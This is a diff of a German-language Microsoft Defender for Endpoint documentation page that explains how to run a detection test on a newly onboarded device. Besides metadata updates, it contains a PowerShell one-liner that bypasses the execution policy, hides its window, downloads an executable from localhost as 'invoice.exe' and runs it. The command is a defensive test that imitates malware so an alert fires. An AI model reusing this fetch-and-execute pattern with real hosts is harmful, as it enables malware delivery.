@@ -18,12 +18,12 @@ ms.collection:
 - m365initiative-defender-endpoint
 ms.topic: article
 ms.technology: mde
-ms.openlocfilehash: 89b8ac7d99cfcd4c5e5e647e5ba54e14184ef0bd
-ms.sourcegitcommit: 3fe7eb32c8d6e01e190b2b782827fbadd73a18e6
+ms.openlocfilehash: 2bb1fde1bfd8ddfa358d1141c3821843e532a8bf
+ms.sourcegitcommit: efb932db63ad3ab4af4b585428d567d069410e4e
 ms.translationtype: MT
 ms.contentlocale: de-DE
-ms.lasthandoff: 04/13/2021
-ms.locfileid: "51688117"
+ms.lasthandoff: 05/11/2021
+ms.locfileid: "52312000"
 ---
 # <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Ausführen eines Erkennungstests auf einem neu integrierten Microsoft Defender for Endpoint-Gerät 
 
@@ -31,7 +31,7 @@ ms.locfileid: "51688117"
 
 
 **Gilt für:**
-- Unterstützte Windows 10-Versionen
+- Unterstützte Windows 10 Versionen
 - Windows Server 2012 R2
 - Windows Server 2016
 - Windows Server, Version 1803
@@ -55,7 +55,7 @@ Führen Sie das folgende PowerShell-Skript auf einem neu integrierten Gerät aus
 3. Kopieren Und führen Sie an der Eingabeaufforderung den folgenden Befehl aus:
 
    ```powershell
-   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
+   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
    ```
 
 Das Eingabeaufforderungsfenster wird automatisch geschlossen. Bei erfolgreicher Erkennung wird der Erkennungstest als abgeschlossen markiert, und eine neue Warnung wird in etwa 10 Minuten im Portal für das integrierte Gerät angezeigt.
